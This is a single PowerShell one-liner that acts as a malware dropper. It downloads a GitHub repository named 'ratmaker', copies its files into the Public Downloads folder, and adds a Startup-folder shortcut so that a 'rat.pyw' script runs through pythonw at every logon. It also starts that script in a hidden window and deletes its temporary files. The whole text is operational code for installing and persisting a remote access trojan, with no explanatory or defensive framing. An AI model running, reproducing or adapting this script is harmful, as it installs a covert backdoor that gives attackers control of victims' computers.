$r="https://github.com/CamWuzHere/ratmaker";$b="main";$p="$env:PUBLIC\Downloads";$s=[System.Environment]::GetFolderPath("Startup");$z="$env:TEMP\z.zip";$d="$env:TEMP\d$([guid]::NewGuid())";if(-not(Test-Path $p)){New-Item -Path $p -ItemType Directory -Force|Out-Null};try{ Invoke-WebRequest "$r/archive/refs/heads/$b.zip" -OutFile $z -UseBasicParsing -ErrorAction Stop; Expand-Archive -LiteralPath $z -DestinationPath $d -Force -ErrorAction Stop; $x=(Get-ChildItem $d -Directory|Select-Object -First 1).FullName } catch { Remove-Item $z -ErrorAction SilentlyContinue; Remove-Item $d -Recurse -ErrorAction SilentlyContinue; exit 1 }; Get-ChildItem $x -Force | Where-Object { -not ($_.Name -match '^README') } | ForEach-Object { $y=Join-Path $p $_.Name; if($_.PSIsContainer){Copy-Item $_.FullName $y -Recurse -Force} else {if($_.Name -ne "pythonw.exe" -or -not (Test-Path $y)){Copy-Item $_.FullName $y -Force}} }; $src=Join-Path $x "rat.jpg"; $dst=Join-Path $p "rat.jpg"; if(Test-Path $src){Copy-Item $src $dst -Force} else {if(Test-Path $dst){Remove-Item $dst -Force}}; $py=Join-Path $p "pythonw.exe"; if(-not(Test-Path $py)){$py="pythonw.exe"}; $shell=New-Object -ComObject WScript.Shell; $lnk=$shell.CreateShortcut((Join-Path $s "R.lnk")); $lnk.TargetPath=$py; $lnk.Arguments="`"$p\rat.pyw`""; $lnk.WorkingDirectory=$p; $lnk.Save(); Start-Process -FilePath $py -ArgumentList "`"$p\rat.pyw`"" -WindowStyle Hidden -ErrorAction SilentlyContinue; Remove-Item $z -Force -ErrorAction SilentlyContinue; Remove-Item $d -Recurse -Force -ErrorAction SilentlyContinue
